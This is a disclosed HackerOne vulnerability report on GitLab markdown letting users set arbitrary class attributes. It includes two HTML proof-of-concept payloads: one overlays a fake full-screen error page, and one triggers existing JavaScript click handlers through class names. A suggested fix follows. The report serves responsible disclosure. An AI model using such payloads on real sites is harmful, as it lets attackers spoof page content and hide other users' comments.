---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '216453'
original_report_id: '216453'
title: Unfiltered `class` attribute in markdown code
weakness: Cross-site Scripting (XSS) - DOM
team_handle: gitlab
created_at: '2017-03-27T16:26:59.771Z'
disclosed_at: '2017-04-13T14:46:15.472Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 11
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# Unfiltered `class` attribute in markdown code

## Metadata

- HackerOne Report ID: 216453
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: gitlab
- Disclosed At: 2017-04-13T14:46:15.472Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

This affects merge request/issue comments and probably other parts of the user interface.

I am demonstrating PoCs on GitLab.com itself, as they don't affect anything outside of my test repo, which is private. It could be used to execute some js actions by contructing content that uses the pre-existing attached event handlers (for example, `onclick`), but I am not sure how far could that go — I have not reviewed that, the mentioned issues are already pretty bad.

This could be used to make some issue/merge request pages inaccessible, to forge page content and potentially forge or hide other users comments in the thread.

## PoC 1 — full-size message
Demo: https://gitlab.com/ChALkeR/my-private-test-project/issues/2
```html
<pre class="zen-backdrop fullscreen sherlock-line-samples-table center">
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<img src="https://about.gitlab.com/images/press/logo/wm_no_bg.svg" width="500">
<h2>Hello there! Something has gone wrong, we are working on it.</h2>
<h3>In the meantime, play a game with us at <a href="http://example.com/">example.com</a>.</h3>
</pre>
```

## PoC 2 — basic JavaScript

Demo: https://gitlab.com/ChALkeR/my-private-test-project/issues/3
```html
<pre class="js-details-expand">click me</pre>
<pre class="js-details-content hide">foo</pre>
```

There is a significant amout of onlick event listeners that are bound using just the classname, so it is possible to do some basic stuff with just classes and might be possible to execute more complex actions.

I have not reviewed all instances in the JS where the classnames are used, that is irrelevant to fixing this issue.

## Suggested fix
Both of the following should be applied:
 * Filter `class` attributes (higher priority).
 * Make sure that user content couldn't be displayed outside of the bounding box, e.g. by applying `oveflow:hidden` (lower priority).

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
